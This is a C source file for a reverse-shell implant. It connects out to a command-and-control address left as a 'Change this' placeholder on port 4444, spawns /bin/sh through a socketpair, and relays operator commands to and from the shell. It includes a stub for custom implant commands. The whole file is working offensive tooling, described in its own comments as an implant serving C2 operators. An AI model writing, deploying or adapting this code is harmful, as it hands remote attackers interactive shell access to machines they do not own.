#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <unistd.h>

#define CALLBACK_IP "127.1" //Change this
#define CALLBACK_PORT 4444 //Change this
#define BUFFER_SIZE 1024

/*
* Function: max
* -------------
* Determines the largest of two values (integers)
*
* val_one: first integer
* val_two: second integer
*
* returns: The largest of two integers, val_one and val_two 
*/
int max(int val_one, int val_two)
{
    return val_one > val_two ? val_one : val_two;
}


/*
* Function: shell_setup
* --------------------
* Creates a socket pair to maintain communication with the spawned
* shell. This will allow for data interception so that custom actions
* and commands can be executed by the implant, or passed to the shell
* as appropriate.

* returns: file descriptor for sending to // receiving from the shell's
* stdin/stdout 
*/
int shell_setup()
{
    pid_t pid = -1;
    int sp[2] = {0, 0};

    if ((socketpair(AF_UNIX, SOCK_STREAM, 0, sp)) < 0)
    {
        perror("failed to create interpreter socket pair");
    }

    if ((pid = fork()) < 0)
    {
        perror("fork");
    }

    if (pid == 0)
    {
        close(sp[1]);

        dup2(sp[0], STDIN_FILENO);
        dup2(sp[0], STDOUT_FILENO);
        dup2(sp[0], STDERR_FILENO);

        system("/bin/sh");
    }

    close(sp[0]);

    return sp[1];
}


/*
* Function: exec_command
* ---------------------
* WIP: Currently only checks for "test" command
* Should eventually check for commands in hashmap
* to determine if command is meant to be executed
* by the implant or shell
* Performs custom operations if appropriate 
*
* command: user entered data to check
* result: output of custom command if one is executed
*
* returns: boolean representing whether commands is 
* known or not
*/
bool exec_command(const char *command, char *result)
{
    const char *check = "test";
    const char *match_output = "matching command found!\n"; 
    if (!strncmp(command, check, strlen(check)))
    {
        strncpy(result, match_output, BUFFER_SIZE); 
        return true;
    }
    else
    {
        return false;
    }
}

/*
* Function: interpreter
* ---------------------
* Main communication loop handling comms between operator
* and agent. Operator may change at any time, and connection
* will be maintained by c2
* Select is used to ensure that if data arrives at any time
* from either end of the connection, it is processed appropriately
* Buffer contents used to determine if data should be written to one
* of the provided pipes
*
* ops_pipe: connection to operator (c2)
* shell_pipe: connection to shell process 
*/
void interpreter(int ops_pipe, int shell_pipe)
{
    struct sockaddr_in client_addr;
    socklen_t cli_len;
    char ops_buf[BUFFER_SIZE];
    char shell_buf[BUFFER_SIZE];
    int recvlen = 0;
    ssize_t read_len = 0;
    fd_set read_set, write_set;
    int maxfd = max(ops_pipe, shell_pipe);

    memset(ops_buf, 0, BUFFER_SIZE);
    memset(shell_buf, 0, BUFFER_SIZE);
    FD_ZERO(&read_set);
    FD_ZERO(&write_set);

    for (;;)
    {

        FD_SET(ops_pipe, &read_set);
        FD_SET(shell_pipe, &read_set);

        //Check if there is data to be written to socks
        //If there is data to be written, have select()
        //check if associated pipe is ready for it.
        if (strlen(ops_buf) > 0)
        {
            FD_SET(ops_pipe, &write_set);
        }
        if (strlen(shell_buf) > 0)
        {
            if (exec_command(shell_buf, ops_buf)) //known command succeeded
            {
                puts("match");
                memset(shell_buf, 0, BUFFER_SIZE);
                FD_SET(ops_pipe, &write_set);
            }
            else //unknown command, pass to shell for execution
            {
                puts("***unknown");
                FD_SET(shell_pipe, &write_set);
            }
        }

        if (select(maxfd+1, &read_set, &write_set, NULL, NULL) < 0)
        {
            perror("select");
            exit(EXIT_FAILURE);
        }

        if(FD_ISSET(ops_pipe, &write_set)) //socket ready to be written
        {
            write(ops_pipe, ops_buf, strlen(ops_buf));
            memset(ops_buf, 0, BUFFER_SIZE);        
            FD_CLR(ops_pipe, &write_set);
        }
        if(FD_ISSET(shell_pipe, &write_set))
        {
            write(shell_pipe, shell_buf, strlen(shell_buf));
            memset(shell_buf, 0, BUFFER_SIZE);
            FD_CLR(shell_pipe, &write_set);
        }

        if(FD_ISSET(ops_pipe, &read_set)) //socket ready to be read
        {
            read(ops_pipe, shell_buf, BUFFER_SIZE);
        }
        if(FD_ISSET(shell_pipe, &read_set))
        {
            read(shell_pipe, ops_buf, BUFFER_SIZE);
        }

    }
    
}

int main()
{
    struct sockaddr_in c2addr;
    int c2_fd = 0;
    int shell_pipe = 0;

    if ((c2_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("failed socket init");
        exit(1);
    }

    memset(&c2addr, 0, sizeof(c2addr));
    c2addr.sin_family = AF_INET;
    c2addr.sin_addr.s_addr = inet_addr(CALLBACK_IP);
    c2addr.sin_port = htons(CALLBACK_PORT); 

    //c2 manages the agent, connecting it to operators
    if (connect(c2_fd, (struct sockaddr*)&c2addr, sizeof(c2addr)) != 0)
    {
        perror("failed to connect");
        exit(2);
    }

    shell_pipe = shell_setup();

    interpreter(c2_fd, shell_pipe);

    close(c2_fd);

    return 0;
}